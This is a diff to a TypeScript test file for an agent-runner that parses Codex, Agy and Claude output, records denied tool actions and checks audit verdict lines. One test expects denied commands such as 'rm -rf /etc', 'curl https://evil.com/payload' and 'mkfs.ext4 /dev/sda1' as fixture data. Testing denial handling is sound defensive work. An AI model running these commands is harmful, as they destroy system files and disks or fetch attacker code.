@@ -125,9 +125,8 @@ describe('Codex Runner Integration', () => {
       expect(req.args).toContain('-m');
       // Default implement model mapped from sonnet -> o3-mini
       expect(req.args).toContain('o3-mini');
-      expect(req.args).toContain('-s');
-      expect(req.args).toContain('workspace-write');
       expect(req.args).toContain('--approve-for-me');
+      expect(req.args).not.toContain('-s');
       expect(req.args).toContain('--json');
     });
 
@@ -189,6 +188,172 @@ describe('Codex Runner Integration', () => {
       expect(req.args).toContain('read-only');
       expect(req.args).toContain('--json');
       expect(req.args).toContain('o3-mini');
+      expect(req.stdout).toBe(path.join(tmpDir, 'docs', 'test-task', 'logs', 'test-audit.json'));
+      expect(req.stderr).toBe(path.join(tmpDir, 'docs', 'test-task', 'logs', 'test-audit.err'));
+    });
+
+    it('extracts multi-turn and diverse tool denials from Codex fixtures', () => {
+      const jsonFile = path.join(tmpDir, 'agent.json');
+      const logFile = path.join(tmpDir, 'agent.log');
+      const stateFile = path.join(tmpDir, 'permissions.json');
+
+      const fixtureContent = fs.readFileSync(path.resolve('test/fixtures/codex/tool-denial-variations.jsonl'), 'utf8');
+      fs.writeFileSync(jsonFile, fixtureContent);
+
+      const pendingCount = extract({
+        jsonFile,
+        logFile,
+        stateFile,
+        stage: 'implement',
+        cwd: tmpDir,
+        allowed: [],
+      });
+
+      expect(pendingCount).toBe(4);
+      const state = JSON.parse(fs.readFileSync(stateFile, 'utf8'));
+      const details = state.pending.map((p: any) => p.detail);
+      expect(details).toContain('rm -rf /etc');
+      expect(details).toContain('curl https://evil.com/payload');
+      expect(details).toContain('git push origin main --force');
+      expect(details).toContain('mkfs.ext4 /dev/sda1');
+    });
+
+    it('extracts text and denials from Agy JSON output format', () => {
+      const jsonFile = path.join(tmpDir, 'agy.json');
+      const logFile = path.join(tmpDir, 'agy.log');
+      const stateFile = path.join(tmpDir, 'permissions.json');
+
+      const agyJson = {
+        response: 'Completed Agy planning phase.',
+        status: 'OK',
+        denied_actions: [
+          { tool: 'command', detail: 'pnpm publish', rule: 'danger' },
+        ],
+      };
+      fs.writeFileSync(jsonFile, JSON.stringify(agyJson));
+
+      const pending = extract({
+        jsonFile,
+        logFile,
+        stateFile,
+        stage: 'plan',
+        cwd: tmpDir,
+        allowed: [],
+      });
+
+      expect(pending).toBe(1);
+      const logText = fs.readFileSync(logFile, 'utf8');
+      expect(logText).toContain('Completed Agy planning phase.');
+      const state = JSON.parse(fs.readFileSync(stateFile, 'utf8'));
+      expect(state.pending[0]).toMatchObject({
+        stage: 'plan',
+        tool: 'Bash',
+        detail: 'pnpm publish',
+      });
+    });
+
+    it('parses Codex JSONL test-audit output and ensures VERDICT: VALID regex matches in test-audit.log', async () => {
+      const logDir = path.join(tmpDir, 'docs', 'test-task', 'logs');
+      fs.mkdirSync(logDir, { recursive: true });
+
+      const auditFixture = fs.readFileSync(path.resolve('test/fixtures/codex/test-audit-valid.jsonl'), 'utf8');
+      const mockSpawn = vi.fn(async (req) => {
+        fs.writeFileSync(req.stdout, auditFixture);
+        return 0;
+      });
+
+      const ctx: any = {
+        root: tmpDir,
+        log: 'docs/test-task/logs',
+        config: {
+          agent: { harness: 'codex' },
+        },
+        env: {},
+        spawnAgent: mockSpawn,
+      };
+
+      const rc = await runAudit(ctx, 'audit prompt', { args: [], env: {} });
+      expect(rc).toBe(0);
+
+      // Raw JSONL stored in test-audit.json
+      const rawJson = fs.readFileSync(path.join(logDir, 'test-audit.json'), 'utf8');
+      expect(rawJson).toContain('audit_msg');
+
+      // Extracted markdown text stored in test-audit.log
+      const logContent = fs.readFileSync(path.join(logDir, 'test-audit.log'), 'utf8');
+      expect(logContent).toContain('VERDICT: VALID');
+      expect(logContent).not.toContain('{"type":');
+
+      // Crucial check: testRepairStage regex /^VERDICT: (VALID|INVALID)$/ must match!
+      const verdict = logContent.split('\n').filter(l => /^VERDICT: (VALID|INVALID)$/.test(l)).pop();
+      expect(verdict).toBe('VERDICT: VALID');
+    });
+
+    it('parses Agy JSON test-audit output and ensures VERDICT: VALID regex matches in test-audit.log', async () => {
+      const logDir = path.join(tmpDir, 'docs', 'test-task', 'logs');
+      fs.mkdirSync(logDir, { recursive: true });
+
+      const agyAudit = JSON.stringify({
+        response: 'Audit complete. Test assertions align with spec.\n\nVERDICT: VALID',
+        status: 'OK',
+      });
+      const mockSpawn = vi.fn(async (req) => {
+        fs.writeFileSync(req.stdout, agyAudit);
+        return 0;
+      });
+
+      const ctx: any = {
+        root: tmpDir,
+        log: 'docs/test-task/logs',
+        config: {
+          agent: { harness: 'agy' },
+        },
+        env: {},
+        spawnAgent: mockSpawn,
+      };
+
+      const rc = await runAudit(ctx, 'audit prompt', { args: [], env: {} });
+      expect(rc).toBe(0);
+
+      const rawJson = fs.readFileSync(path.join(logDir, 'test-audit.json'), 'utf8');
+      expect(rawJson).toContain('"response":');
+
+      const logContent = fs.readFileSync(path.join(logDir, 'test-audit.log'), 'utf8');
+      expect(logContent).toContain('Audit complete.');
+      expect(logContent).not.toContain('"response"');
+
+      const verdict = logContent.split('\n').filter(l => /^VERDICT: (VALID|INVALID)$/.test(l)).pop();
+      expect(verdict).toBe('VERDICT: VALID');
+    });
+
+    it('handles Claude plain-text test-audit output correctly', async () => {
+      const logDir = path.join(tmpDir, 'docs', 'test-task', 'logs');
+      fs.mkdirSync(logDir, { recursive: true });
+
+      const claudeText = 'I inspected the tests and verified they pass.\nVERDICT: VALID\n';
+      const mockSpawn = vi.fn(async (req) => {
+        fs.writeFileSync(req.stdout, claudeText);
+        return 0;
+      });
+
+      const ctx: any = {
+        root: tmpDir,
+        log: 'docs/test-task/logs',
+        config: {
+          agent: { harness: 'claude' },
+        },
+        env: {},
+        spawnAgent: mockSpawn,
+      };
+
+      const rc = await runAudit(ctx, 'audit prompt', { args: [], env: {} });
+      expect(rc).toBe(0);
+
+      const logContent = fs.readFileSync(path.join(logDir, 'test-audit.log'), 'utf8');
+      expect(logContent).toBe(claudeText);
+
+      const verdict = logContent.split('\n').filter(l => /^VERDICT: (VALID|INVALID)$/.test(l)).pop();
+      expect(verdict).toBe('VERDICT: VALID');
     });
   });
 });
